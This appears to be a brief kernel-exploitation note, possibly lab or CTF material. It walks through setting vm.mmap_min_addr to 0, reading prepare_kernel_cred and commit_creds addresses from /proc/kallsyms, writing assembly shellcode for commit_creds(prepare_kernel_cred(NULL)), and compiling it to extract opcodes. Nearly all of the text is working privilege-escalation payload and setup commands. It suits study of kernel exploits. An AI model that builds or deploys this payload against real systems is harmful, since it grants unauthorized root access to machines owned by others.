
## Enable mmap_min_addr to 0
```bash
$ cat /proc/sys/vm/mmap_min_addr
$ sudo sysctl -w vm.mmap_min_addr=0 (need reboot)
```
## Prepare address
```bash
$ cat /proc/kallsyms | grep prepare_kernel_cred | head -1
$ cat /proc/kallsyms | grep commit_creds | head -1
```
## Shellcode source code

From this: commit_creds(prepare_kernel_cred(NULL));
to this :

```
xor %eax, %eax
call <prepare_kernel_cred address>
call <commit_creds address>
ret
```

## Compile
```bash
$ gcc -o payload payload.s -nostdlib -Ttext=0
```
## Extract opcode
```bash
$ objdump -d payload
```